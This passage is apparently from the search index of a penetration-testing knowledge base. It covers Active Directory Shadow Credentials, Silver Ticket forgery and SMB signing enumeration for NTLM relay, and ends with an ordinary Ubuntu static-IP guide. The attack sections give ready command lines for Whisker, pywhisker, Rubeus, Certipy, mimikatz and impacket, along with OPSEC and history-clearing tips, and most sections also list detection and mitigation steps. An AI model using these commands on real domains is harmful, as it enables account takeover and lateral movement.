target</p>","tags":["#type/technique","#tactic/TA0006","#technique/T1558001","#stage/credential-access","#stage/privilege-escalation","#os/windows","#tool/pywhisker","#tool/whisker","#tool/certipy","#tool/rubeus"]},{"location":"Active%20Directory/flat/shadow_credentials/#considerations","title":"Considerations","text":"<p>Impact</p> <p>A successful Shadow Credentials attack gives the attacker the ability to authenticate as the target account without changing the password, providing persistent access that can be difficult to detect. This technique is particularly useful for lateral movement and privilege escalation, especially when targeting administrative accounts.</p> <p>OPSEC</p> <ul> <li> <p>Persistence: The added key material remains in the attribute until removed, providing persistent access even if the target's password changes.</p> </li> <li> <p>Low Noise: Unlike password spraying or brute force attempts, this attack doesn't generate authentication failure events.</p> </li> <li> <p>Modification Logs: Writing to the <code>msDS-KeyCredentialLink</code> attribute generates Event ID 4662 (Operation performed on an object) with the target object and attribute specified.</p> </li> <li> <p>Certificate-Based Authentication: The use of PKINIT generates Event ID 4768 (Kerberos authentication ticket (TGT) was requested) with certificate authentication indicated.</p> </li> </ul>","tags":["#type/technique","#tactic/TA0006","#technique/T1558001","#stage/credential-access","#stage/privilege-escalation","#os/windows","#tool/pywhisker","#tool/whisker","#tool/certipy","#tool/rubeus"]},{"location":"Active%20Directory/flat/shadow_credentials/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1558001","#stage/credential-access","#stage/privilege-escalation","#os/windows","#tool/pywhisker","#tool/whisker","#tool/certipy","#tool/rubeus"]},{"location":"Active%20Directory/flat/shadow_credentials/#identifying-vulnerable-targets","title":"Identifying Vulnerable Targets","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1558001","#stage/credential-access","#stage/privilege-escalation","#os/windows","#tool/pywhisker","#tool/whisker","#tool/certipy","#tool/rubeus"]},{"location":"Active%20Directory/flat/shadow_credentials/#powerview","title":"PowerView","text":"<p>Identify objects you have write access to:</p> <pre><code>Import-Module .\\PowerView.ps1\nFind-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match \"YourAccount\"} | Select-Object ObjectDN, ActiveDirectoryRights\n</code></pre>","tags":["#type/technique","#tactic/TA0006","#technique/T1558001","#stage/credential-access","#stage/privilege-escalation","#os/windows","#tool/pywhisker","#tool/whisker","#tool/certipy","#tool/rubeus"]},{"location":"Active%20Directory/flat/shadow_credentials/#bloodhound","title":"BloodHound","text":"<p>Find objects with the required permissions:</p> <pre><code>MATCH p=(u:User {name:'DOMAIN\\\\YourAccount'})-[r]-&gt;(n) \nWHERE r.isacl=true AND (r.rights CONTAINS 'GenericAll' OR r.rights CONTAINS 'GenericWrite' OR r.rights CONTAINS 'WriteProperty') \nRETURN p\n</code></pre>","tags":["#type/technique","#tactic/TA0006","#technique/T1558001","#stage/credential-access","#stage/privilege-escalation","#os/windows","#tool/pywhisker","#tool/whisker","#tool/certipy","#tool/rubeus"]},{"location":"Active%20Directory/flat/shadow_credentials/#adding-shadow-credentials","title":"Adding Shadow Credentials","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1558001","#stage/credential-access","#stage/privilege-escalation","#os/windows","#tool/pywhisker","#tool/whisker","#tool/certipy","#tool/rubeus"]},{"location":"Active%20Directory/flat/shadow_credentials/#whisker-powershell","title":"Whisker (PowerShell)","text":"<p>Add a shadow credential to a target user:</p> <pre><code>Import-Module .\\Whisker.ps1\nNew-ShadowCredential -Domain \"domain.local\" -Target \"TargetUser\" -Credential (Get-Credential) -ErrorAction Stop\n</code></pre> <p>Export private key and certificate:</p> <pre><code>New-ShadowCredential -Domain \"domain.local\" -Target \"TargetUser\" -Credential (Get-Credential) -Export C:\\Temp\\ShadowCred.pfx -Password (ConvertTo-SecureString -AsPlainText -Force 'Password123!')\n</code></pre>","tags":["#type/technique","#tactic/TA0006","#technique/T1558001","#stage/credential-access","#stage/privilege-escalation","#os/windows","#tool/pywhisker","#tool/whisker","#tool/certipy","#tool/rubeus"]},{"location":"Active%20Directory/flat/shadow_credentials/#pywhisker-python","title":"Pywhisker (Python)","text":"<p>Add a shadow credential to a target user:</p> <pre><code>python3 pywhisker.py -d \"domain.local\" -u \"YourAccount\" -p \"YourPassword\" --target \"TargetUser\" --action add\n</code></pre> <p>Add shadow credential and save certificate:</p> <pre><code>python3 pywhisker.py -d \"domain.local\" -u \"YourAccount\" -p \"YourPassword\" --target \"TargetUser\" --action add --filename shadow.pfx --pfx-password \"Password123!\"\n</code></pre>","tags":["#type/technique","#tactic/TA0006","#technique/T1558001","#stage/credential-access","#stage/privilege-escalation","#os/windows","#tool/pywhisker","#tool/whisker","#tool/certipy","#tool/rubeus"]},{"location":"Active%20Directory/flat/shadow_credentials/#authenticating-with-shadow-credentials","title":"Authenticating with Shadow Credentials","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1558001","#stage/credential-access","#stage/privilege-escalation","#os/windows","#tool/pywhisker","#tool/whisker","#tool/certipy","#tool/rubeus"]},{"location":"Active%20Directory/flat/shadow_credentials/#rubeus","title":"Rubeus","text":"<p>Request TGT using the certificate:</p> <pre><code>.\\Rubeus.exe asktgt /user:\"TargetUser\" /domain:\"domain.local\" /certificate:\"MIIJuAIBAzCCCXQGCSq...\" /password:\"Password123!\" /nowrap\n</code></pre> <p>Or using the certificate file:</p> <pre><code>.\\Rubeus.exe asktgt /user:\"TargetUser\" /domain:\"domain.local\" /certfile:\"C:\\Temp\\ShadowCred.pfx\" /certpass:\"Password123!\" /nowrap\n</code></pre>","tags":["#type/technique","#tactic/TA0006","#technique/T1558001","#stage/credential-access","#stage/privilege-escalation","#os/windows","#tool/pywhisker","#tool/whisker","#tool/certipy","#tool/rubeus"]},{"location":"Active%20Directory/flat/shadow_credentials/#certipy","title":"Certipy","text":"<p>Request TGT using the shadow credentials:</p> <pre><code>certipy auth -pfx shadow.pfx -dc-ip 192.168.1.10 -username TargetUser -domain domain.local\n</code></pre> <p>Use Kerberos authentication for subsequent actions:</p> <pre><code>export KRB5CCNAME=TargetUser.ccache\nimpacket-psexec domain.local/TargetUser@target-server -k -no-pass\n</code></pre>","tags":["#type/technique","#tactic/TA0006","#technique/T1558001","#stage/credential-access","#stage/privilege-escalation","#os/windows","#tool/pywhisker","#tool/whisker","#tool/certipy","#tool/rubeus"]},{"location":"Active%20Directory/flat/shadow_credentials/#cleaning-up","title":"Cleaning Up","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1558001","#stage/credential-access","#stage/privilege-escalation","#os/windows","#tool/pywhisker","#tool/whisker","#tool/certipy","#tool/rubeus"]},{"location":"Active%20Directory/flat/shadow_credentials/#whisker","title":"Whisker","text":"<p>Remove the shadow credential:</p> <pre><code>New-ShadowCredential -Domain \"domain.local\" -Target \"TargetUser\" -Credential (Get-Credential) -Clear -KeyID \"4c0c9f99-b4f3-4f45-9421-ac436a47d9e0\"\n</code></pre>","tags":["#type/technique","#tactic/TA0006","#technique/T1558001","#stage/credential-access","#stage/privilege-escalation","#os/windows","#tool/pywhisker","#tool/whisker","#tool/certipy","#tool/rubeus"]},{"location":"Active%20Directory/flat/shadow_credentials/#pywhisker","title":"Pywhisker","text":"<p>Remove the shadow credential:</p> <pre><code>python3 pywhisker.py -d \"domain.local\" -u \"YourAccount\" -p \"YourPassword\" --target \"TargetUser\" --action remove --key-id \"4c0c9f99-b4f3-4f45-9421-ac436a47d9e0\"\n</code></pre>","tags":["#type/technique","#tactic/TA0006","#technique/T1558001","#stage/credential-access","#stage/privilege-escalation","#os/windows","#tool/pywhisker","#tool/whisker","#tool/certipy","#tool/rubeus"]},{"location":"Active%20Directory/flat/shadow_credentials/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1558001","#stage/credential-access","#stage/privilege-escalation","#os/windows","#tool/pywhisker","#tool/whisker","#tool/certipy","#tool/rubeus"]},{"location":"Active%20Directory/flat/shadow_credentials/#detection","title":"Detection","text":"<ul> <li> <p>Event ID 4662: Operations performed on Active Directory objects. Look for modifications to the <code>msDS-KeyCredentialLink</code> attribute.</p> </li> <li> <p>Event ID 4768: Kerberos TGT request with certificate-based authentication.</p> </li> <li> <p>Monitor for unexpected changes to the <code>msDS-KeyCredentialLink</code> attribute, especially for privileged accounts.</p> </li> <li> <p>Regular audits of Key Credentials associated with sensitive accounts.</p> </li> </ul>","tags":["#type/technique","#tactic/TA0006","#technique/T1558001","#stage/credential-access","#stage/privilege-escalation","#os/windows","#tool/pywhisker","#tool/whisker","#tool/certipy","#tool/rubeus"]},{"location":"Active%20Directory/flat/shadow_credentials/#mitigation","title":"Mitigation","text":"<ul> <li> <p>Protected Users Group: Add sensitive accounts to the \"Protected Users\" security group, which prevents the use of PKINIT.</p> </li> <li> <p>Restricted Admin Permission: Implement least privilege principles for account permissions in Active Directory.</p> </li> <li> <p>Privileged Access Management: Implement time-bound, just-in-time access to sensitive accounts.</p> </li> <li> <p>Enhanced Monitoring: Deploy solutions that monitor for changes to sensitive attributes like <code>msDS-KeyCredentialLink</code>.</p> </li> <li> <p>Hardened Security Descriptors: Modify security descriptors on sensitive objects to prevent unauthorized write access.</p> </li> </ul>","tags":["#type/technique","#tactic/TA0006","#technique/T1558001","#stage/credential-access","#stage/privilege-escalation","#os/windows","#tool/pywhisker","#tool/whisker","#tool/certipy","#tool/rubeus"]},{"location":"Active%20Directory/flat/silver_ticket/","title":"Silver ticket","text":"","tags":["#type/technique","#tactic/TA0003","#tactic/TA0008","#technique/T1558.002","#stage/persistence","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/mimikatz","#tool/impacket"]},{"location":"Active%20Directory/flat/silver_ticket/#technique","title":"Technique","text":"<p>A Silver Ticket is a forged Kerberos service ticket (TGS) that an attacker creates using the password hash of a service account. Unlike a Golden Ticket (which is a forged TGT signed with the KRBTGT hash), a Silver Ticket is specific to a particular service on a particular server.</p> <p>This technique allows an attacker to bypass the normal Kerberos authentication process and gain unauthorized access to specific services without interacting with the Domain Controller. By forging a service ticket, an attacker can impersonate any user of their choosing to the targeted service.</p>","tags":["#type/technique","#tactic/TA0003","#tactic/TA0008","#technique/T1558.002","#stage/persistence","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/mimikatz","#tool/impacket"]},{"location":"Active%20Directory/flat/silver_ticket/#prerequisites","title":"Prerequisites","text":"<p>Access Level: An attacker must first obtain the password hash (NTLM hash, RC4 key, or AES keys) of the target computer account or service account. This typically requires prior administrative access to the target server.</p> <p>Information Needed: - Service account password hash or computer account password hash - Domain SID - Domain name - Username to impersonate - Target server FQDN - Service SPN (Service Principal Name) type (e.g., CIFS, HTTP, MSSQL)</p>","tags":["#type/technique","#tactic/TA0003","#tactic/TA0008","#technique/T1558.002","#stage/persistence","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/mimikatz","#tool/impacket"]},{"location":"Active%20Directory/flat/silver_ticket/#considerations","title":"Considerations","text":"<p>Impact</p> <p>Silver Tickets provide targeted persistence and lateral movement capabilities, allowing an attacker to: - Access specific services as any user, including privileged accounts - Operate without communicating with a Domain Controller - Potentially bypass detection mechanisms that focus on TGT issuance</p> <p>Limitations</p> <ul> <li>Limited to specific services on specific hosts (unlike Golden Tickets, which work domain-wide)</li> <li>Computer account passwords change automatically every 30 days by default, requiring the attacker to re-obtain the hash</li> <li>Does not provide a valid PAC (Privilege Attribute Certificate) for domain services that validate PACs</li> </ul> <p>OPSEC</p> <ul> <li>Silver Tickets generate fewer event logs than normal Kerberos authentication</li> <li>No event logs are generated on Domain Controllers since they're not involved in the ticket creation</li> <li>Can potentially evade detection systems that focus on unusual TGT requests</li> </ul>","tags":["#type/technique","#tactic/TA0003","#tactic/TA0008","#technique/T1558.002","#stage/persistence","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/mimikatz","#tool/impacket"]},{"location":"Active%20Directory/flat/silver_ticket/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0003","#tactic/TA0008","#technique/T1558.002","#stage/persistence","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/mimikatz","#tool/impacket"]},{"location":"Active%20Directory/flat/silver_ticket/#using-mimikatz","title":"Using Mimikatz","text":"<p>First, obtain the necessary information for creating a Silver Ticket: - Domain SID: Use <code>whoami /user</code> (the SID minus the last portion is the domain SID) - Target server name and service type - Password hash of the service/computer account</p> <p>Create and inject the Silver Ticket:</p> <pre><code># Basic Silver Ticket for CIFS service on DC01\nmimikatz # kerberos::golden /domain:contoso.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /target:dc01.contoso.local /service:cifs /rc4:1a59bd44fe5bec57d1c8f98e253a7091 /user:Administrator /ptt\n\n# Silver Ticket for HOST service\nmimikatz # kerberos::golden /domain:contoso.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /target:server01.contoso.local /service:host /rc4:1a59bd44fe5bec57d1c8f98e253a7091 /user:Administrator /ptt\n\n# Silver Ticket with AES256 key instead of RC4\nmimikatz # kerberos::golden /domain:contoso.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /target:server01.contoso.local /service:cifs /aes256:1a59bd44fe5bec57d1c8f98e253a7091b59bd44fe5bec57d1c8f98e253a70915 /user:Administrator /ptt\n</code></pre>","tags":["#type/technique","#tactic/TA0003","#tactic/TA0008","#technique/T1558.002","#stage/persistence","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/mimikatz","#tool/impacket"]},{"location":"Active%20Directory/flat/silver_ticket/#using-impacket","title":"Using Impacket","text":"<pre><code># Generate a Silver Ticket for CIFS service on server01\nimpacket-ticketer -nthash 1a59bd44fe5bec57d1c8f98e253a7091 -domain contoso.local -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -spn cifs/server01.contoso.local Administrator\n\n# Set the ticket for use\nexport KRB5CCNAME=Administrator.ccache\n\n# Use the ticket to access the target\nimpacket-smbclient -k server01.contoso.local -no-pass\n</code></pre>","tags":["#type/technique","#tactic/TA0003","#tactic/TA0008","#technique/T1558.002","#stage/persistence","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/mimikatz","#tool/impacket"]},{"location":"Active%20Directory/flat/silver_ticket/#common-service-types-for-silver-tickets","title":"Common Service Types for Silver Tickets","text":"<p>Different services require different SPNs for effective Silver Ticket attacks:</p> Service SPN Type Possible Actions File Shares CIFS Access files on the target server PowerShell Remoting HOST, HTTP, WSMAN Remote PowerShell access WMI HOST, RPCSS Remote WMI queries and execution Scheduled Tasks HOST Create or modify scheduled tasks Windows Management RPCSS Remote management operations SQL Server MSSQL Database access and command execution DNS Server DNS DNS administration","tags":["#type/technique","#tactic/TA0003","#tactic/TA0008","#technique/T1558.002","#stage/persistence","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/mimikatz","#tool/impacket"]},{"location":"Active%20Directory/flat/silver_ticket/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0003","#tactic/TA0008","#technique/T1558.002","#stage/persistence","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/mimikatz","#tool/impacket"]},{"location":"Active%20Directory/flat/silver_ticket/#detection","title":"Detection","text":"<ul> <li>Look for events with mismatched SPNs and services being accessed</li> <li>Monitor for service ticket requests without corresponding TGT activity</li> <li>Check for anomalies in PAC validation</li> <li>Audit for unexpected privileged actions by accounts, particularly against specific services</li> </ul>","tags":["#type/technique","#tactic/TA0003","#tactic/TA0008","#technique/T1558.002","#stage/persistence","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/mimikatz","#tool/impacket"]},{"location":"Active%20Directory/flat/silver_ticket/#mitigation","title":"Mitigation","text":"<ul> <li>Implement strong password policies for service accounts</li> <li>Use Group Managed Service Accounts (gMSAs) where possible to automate password management</li> <li>Enable Kerberos PAC validation on sensitive servers</li> <li>Consider shortening the machine account password change interval from the default 30 days</li> <li>Implement robust monitoring for suspicious Kerberos ticket usage</li> <li>Use the Protected Users security group for privileged accounts</li> <li>Implement tiered administration and network segmentation to limit credential exposure</li> </ul>","tags":["#type/technique","#tactic/TA0003","#tactic/TA0008","#technique/T1558.002","#stage/persistence","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/mimikatz","#tool/impacket"]},{"location":"Active%20Directory/flat/smb_signing/","title":"Smb signing","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1557001","#stage/reconnaissance","#stage/lateral-movement","#os/windows","#protocol/smb","#tool/nmap","#tool/netexec","#tool/bloodhound","#tool/powerview","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/smb_signing/#technique","title":"Technique","text":"<p>SMB (Server Message Block) signing is a security feature that digitally signs SMB packets, allowing recipients to verify the sender's identity and message integrity. When SMB signing is not enforced, attackers can perform man-in-the-middle attacks by intercepting and modifying SMB traffic without detection.</p> <p>Identifying systems with SMB signing disabled is a critical reconnaissance step before performing NTLM relay attacks. In these attacks, an attacker captures authentication traffic from one system and relays it to another system where SMB signing is not enforced, effectively impersonating the victim and potentially gaining unauthorized access with their privileges.</p> <p>This technique is particularly dangerous in Active Directory environments where service accounts or administrative users might be coerced into authenticating to attacker-controlled systems, allowing for lateral movement and privilege escalation.</p>","tags":["#type/technique","#tactic/TA0007","#technique/T1557001","#stage/reconnaissance","#stage/lateral-movement","#os/windows","#protocol/smb","#tool/nmap","#tool/netexec","#tool/bloodhound","#tool/powerview","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/smb_signing/#prerequisites","title":"Prerequisites","text":"<p>Access Level:  - Unauthenticated network access for basic enumeration - Domain user credentials for more comprehensive scanning (optional)</p> <p>System State:  - Target systems with SMB services accessible (TCP port 445) - Network connectivity to potential target systems</p> <p>Tools Required: - Network scanning tools (Nmap, NetExec) - Domain enumeration tools for authenticated scanning (PowerView) - BloodHound for visualizing attack paths (optional)</p>","tags":["#type/technique","#tactic/TA0007","#technique/T1557001","#stage/reconnaissance","#stage/lateral-movement","#os/windows","#protocol/smb","#tool/nmap","#tool/netexec","#tool/bloodhound","#tool/powerview","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/smb_signing/#considerations","title":"Considerations","text":"<p>Impact</p> <p>Discovering systems with SMB signing disabled can lead to: - Lateral movement across the network by relaying authentication - Privilege escalation if high-privilege account credentials are relayed - Domain compromise if Domain Admin credentials are captured and relayed - Access to sensitive file shares and systems without direct authentication</p> <p>OPSEC</p> <ul> <li>Scanning large IP ranges for SMB signing status may generate significant network traffic</li> <li>Multiple failed SMB connections might trigger security alerts</li> <li>Authenticated scans will create login events that could be monitored</li> <li>Using domain credentials creates trackable authentication events</li> </ul>","tags":["#type/technique","#tactic/TA0007","#technique/T1557001","#stage/reconnaissance","#stage/lateral-movement","#os/windows","#protocol/smb","#tool/nmap","#tool/netexec","#tool/bloodhound","#tool/powerview","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/smb_signing/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1557001","#stage/reconnaissance","#stage/lateral-movement","#os/windows","#protocol/smb","#tool/nmap","#tool/netexec","#tool/bloodhound","#tool/powerview","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/smb_signing/#unauthenticated-enumeration","title":"Unauthenticated Enumeration","text":"<p>Using Nmap: <pre><code># Scan a single host\nsudo nmap -p 445 --script=smb-security-mode.nse &lt;target-ip&gt;\n\n# Scan an entire subnet\nsudo nmap -p 445 --script=smb-security-mode.nse &lt;target-ip/range&gt;\n</code></pre></p> <p>Using NetExec (formerly CrackMapExec): <pre><code># Scan a subnet and generate a list of hosts with SMB signing disabled\nnxc smb &lt;subnet&gt; --gen-relay-list nosigning.txt\n</code></pre></p> <p>Using auth.py tool: <pre><code># Quick check of SMB signing status\nauth smb &lt;subnet&gt;\n</code></pre></p>","tags":["#type/technique","#tactic/TA0007","#technique/T1557001","#stage/reconnaissance","#stage/lateral-movement","#os/windows","#protocol/smb","#tool/nmap","#tool/netexec","#tool/bloodhound","#tool/powerview","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/smb_signing/#authenticated-enumeration","title":"Authenticated Enumeration","text":"<p>Setup a domain context: <pre><code># Create a new command prompt with domain credentials\nrunas /netonly /user:domain\\username cmd.exe\n\n# Start PowerShell with script execution\npowershell -ep bypass\n</code></pre></p> <p>Using PowerView to identify targets: <pre><code># Import PowerView\n. .\\PowerView.ps1\n\n# Export list of domain computers to a file\nGet-DomainComputer -Properties dnshostname | Select-Object -ExpandProperty dnshostname | Out-File -FilePath computers.txt\n</code></pre></p> <p>Scan the exported computers: <pre><code># Use NetExec to check SMB signing status\nnxc smb computers.txt --gen-relay-list vulnerable_hosts.txt\n</code></pre></p>","tags":["#type/technique","#tactic/TA0007","#technique/T1557001","#stage/reconnaissance","#stage/lateral-movement","#os/windows","#protocol/smb","#tool/nmap","#tool/netexec","#tool/bloodhound","#tool/powerview","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/smb_signing/#using-bloodhound","title":"Using BloodHound","text":"<p>Query for vulnerable systems: <pre><code># Find computers with SMB signing disabled\nMATCH (n:Computer)\nWHERE n.smbsigning = False\nRETURN n\n\n# Find attack paths to high-value targets through computers with SMB signing disabled\nMATCH p=shortestPath((u:User)-[*1..]-&gt;(g:Group {name: \"DOMAIN ADMINS@DOMAIN.LOCAL\"}))\nMATCH (c:Computer {smbsigning: False})\nRETURN p, c\n</code></pre></p>","tags":["#type/technique","#tactic/TA0007","#technique/T1557001","#stage/reconnaissance","#stage/lateral-movement","#os/windows","#protocol/smb","#tool/nmap","#tool/netexec","#tool/bloodhound","#tool/powerview","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/smb_signing/#cleanup-considerations","title":"Cleanup Considerations","text":"<ul> <li>Remove any generated files containing lists of vulnerable systems</li> <li>Clear command history that might contain scanning commands</li> <li>Log out of any authenticated sessions created for enumeration</li> </ul>","tags":["#type/technique","#tactic/TA0007","#technique/T1557001","#stage/reconnaissance","#stage/lateral-movement","#os/windows","#protocol/smb","#tool/nmap","#tool/netexec","#tool/bloodhound","#tool/powerview","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/smb_signing/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1557001","#stage/reconnaissance","#stage/lateral-movement","#os/windows","#protocol/smb","#tool/nmap","#tool/netexec","#tool/bloodhound","#tool/powerview","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/smb_signing/#detection","title":"Detection","text":"<ul> <li>Monitor for port scans targeting TCP/445 across multiple systems</li> <li>Watch for unusual SMB traffic patterns and connection attempts</li> <li>Look for authentication attempts from unexpected source systems</li> <li>Monitor for Event ID 4624 (successful logon) from administrative accounts on unusual systems</li> <li>Set up honeypot systems with SMB signing disabled to detect scanning activity</li> </ul>","tags":["#type/technique","#tactic/TA0007","#technique/T1557001","#stage/reconnaissance","#stage/lateral-movement","#os/windows","#protocol/smb","#tool/nmap","#tool/netexec","#tool/bloodhound","#tool/powerview","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/smb_signing/#mitigation","title":"Mitigation","text":"<p>Enable and Enforce SMB Signing: <pre><code># Server-side registry settings\nSet-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters\" -Name \"RequireSecuritySignature\" -Value 1 -Type DWord\nSet-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters\" -Name \"EnableSecuritySignature\" -Value 1 -Type DWord\n\n# Client-side registry settings\nSet-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Services\\LanManWorkstation\\Parameters\" -Name \"RequireSecuritySignature\" -Value 1 -Type DWord\nSet-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Services\\LanManWorkstation\\Parameters\" -Name \"EnableSecuritySignature\" -Value 1 -Type DWord\n</code></pre></p> <p>Group Policy Settings: - Configure \"Microsoft network server: Digitally sign communications (always)\" to Enabled - Configure \"Microsoft network client: Digitally sign communications (always)\" to Enabled</p> <p>Additional Mitigations: - Disable NTLM authentication where possible in favor of Kerberos - Upgrade to SMB 3.0+ which has enhanced security features - Disable SMBv1 which lacks modern security protections - Implement network segmentation to limit the impact of relay attacks - Use Extended Protection for Authentication (EPA) where available</p>","tags":["#type/technique","#tactic/TA0007","#technique/T1557001","#stage/reconnaissance","#stage/lateral-movement","#os/windows","#protocol/smb","#tool/nmap","#tool/netexec","#tool/bloodhound","#tool/powerview","privileges/unauthenticated"]},{"location":"Active%20Directory/flat/static_ip/","title":"Static ip","text":"","tags":["#type/technique","#tactic/TA0008","#technique/T1562002","#stage/configuration-management","#os/linux","#tool/netplan"]},{"location":"Active%20Directory/flat/static_ip/#technique","title":"Technique","text":"<p>Configuring a static IP address on an Ubuntu system is a fundamental system administration task. A static IP ensures the machine's address remains consistent, which is essential for servers and services that need to be reliably accessible on a network, such as web servers, database servers, and firewalls. This note outlines how to configure, apply, and remove a static IP using Netplan, the default network configuration tool for modern Ubuntu distributions.</p>","tags":["#type/technique","#tactic/TA0008","#technique/T1562002","#stage/configuration-management","#os/linux","#tool/netplan"]},{"location":"Active%20Directory/flat/static_ip/#prerequisites","title":"Prerequisites","text":"<p>Access Level: Root or sudo privileges on the Ubuntu system.</p> <p>System State: Ubuntu Server 18.04 LTS or newer (or Desktop with Netplan installed).</p> <p>Information: You will need the following network details from your network administrator or router:</p> <ul> <li> <p>IP Address: The static address you wish to assign (e.g., 192.168.1.50). Subnet Mask: The subnet in CIDR notation (e.g., /24).</p> </li> <li> <p>Gateway: The IP address of your default gateway (e.g., 192.168.1.1).</p> </li> <li> <p>DNS Servers: One or more DNS server addresses (e.g., 8.8.8.8, 8.8.4.4).</p> </li> </ul>","tags":["#type/technique","#tactic/TA0008","#technique/T1562002","#stage/configuration-management","#os/linux","#tool/netplan"]},{"location":"Active%20Directory/flat/static_ip/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0008","#technique/T1562002","#stage/configuration-management","#os/linux","#tool/netplan"]},{"location":"Active%20Directory/flat/static_ip/#identify-your-network-interface","title":"Identify Your Network Interface","text":"<p>Before making changes, identify the name of the network interface you want to configure. This is typically something like eth0 or enp0s3.</p> <pre><code>ip a\n</code></pre>","tags":["#type/technique","#tactic/TA0008","#technique/T1562002","#stage/configuration-management","#os/linux","#tool/netplan"]},{"location":"Active%20Directory/flat/static_ip/#configure-the-static-ip-with-netplan","title":"Configure the Static IP with Netplan","text":"<p>Netplan configurations are stored in YAML files in the /etc/netplan/ directory. You will likely find a file named something like 01-netcfg.yaml or 50-cloud-init.yaml.</p> <p>Open the configuration file with your preferred text editor (e.g., nano).</p> <pre><code>sudo nano /etc/netplan/01-netcfg.yaml\n</code></pre> <p>Modify the file to replace the dhcp4: true setting with the static IP details. The syntax is very specific, so pay close attention to indentation.</p> <pre><code>network:\n  version: 2\n  renderer: networkd\n  ethernets:\n    enp0s3:\n      dhcp4: no\n      addresses:\n        - 192.168.1.50/24\n      routes:\n        - to: default\n          via: 192.168.1.1\n      nameservers:\n        addresses: [8.8.8.8, 8.8.4.4]\n</code></pre> <ul> <li><code>renderer</code>: Specifies the backend for network management. Use <code>networkd</code> for most systems.</li> <li><code>enp0s3</code>: Replace with your actual network interface name.</li> <li><code>addresses</code>: Use CIDR notation for the IP address and subnet mask.</li> <li><code>routes</code>: Defines the default gateway.</li> <li><code>nameservers</code>: A list of DNS servers.</li> </ul>","tags":["#type/technique","#tactic/TA0008","#technique/T1562002","#stage/configuration-management","#os/linux","#tool/netplan"]},{"location":"Active%20Directory/flat/static_ip/#apply-the-configuration","title":"Apply the Configuration","text":"<p>After saving the file, apply the changes using the netplan apply command.</p> <pre><code>sudo netplan apply\n</code></pre> <p>This command will apply the configuration without a reboot. If there are any syntax errors in your YAML file, Netplan will report them.</p>","tags":["#type/technique","#tactic/TA0008","#technique/T1562002","#stage/configuration-management","#os/linux","#tool/netplan"]},{"location":"Active%20Directory/flat/static_ip/#verify-the-configuration","title":"Verify the Configuration","text":"<p>Verify the new IP address has been assigned and network connectivity is working.</p> <pre><code>ip a\n</code></pre>","tags":["#type/technique","#tactic/TA0008","#technique/T1562002","#stage/configuration-management","#os/linux","#tool/netplan"]},{"location":"Active%20Directory/flat/static_ip/#reverting-to-dhcp","title":"Reverting to DHCP","text":"<p>To revert to a dynamic IP address, edit the Netplan configuration file and change the addresses and nameservers sections back to dhcp4: true.</p> <pre><code>network:\n  version: 2\n  renderer: networkd\n  ethernets:\n    enp0s3:\n      dhcp4: yes\n</code></pre>","tags":["#type/technique","#tactic/TA0008","#technique/T1562002","#stage/configuration-management","#os/linux","#tool/netplan"]},{"location":"Active%20Directory/flat/static_ip/#apply-the-changes","title":"Apply the changes:","text":"<pre><code>sudo netplan apply\n</code></pre>","tags":["#type/technique","#tactic/TA0008","#technique/T1562002","#stage/configuration-management","#os/linux","#tool/netplan"]},{"location":"Active%20Directory/flat/static_ip/#cleanup-considerations","title":"Cleanup Considerations","text":"<p>Ensure you save a backup of the original /etc/netplan/ file before making changes.</p> <p>Be aware that incorrect YAML syntax can cause network connectivity to fail. Always run sudo netplan try first to test the configuration. netplan try will revert the changes if you don't confirm them within 120 seconds.</p>","tags":["#type/technique","#tactic/TA0008","#technique/T1562002","#stage/configuration-management","#os/linux","#tool/netplan"]},{"location":"Active%20Directory/flat/static_ip/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0008","#technique/T1562002","#stage/configuration-management","#os/linux","#tool/netplan"]},{"location":"Active%20Directory/flat/static_ip/#detection","title":"Detection","text":"<ul> <li> <p>System Logs: Look for changes in /var/log/syslog related to netplan or systemd-networkd.</p> </li> <li> <p>File Integrity Monitoring (FIM): Monitor the /etc/netplan/ directory for any file modifications.</p> </li> 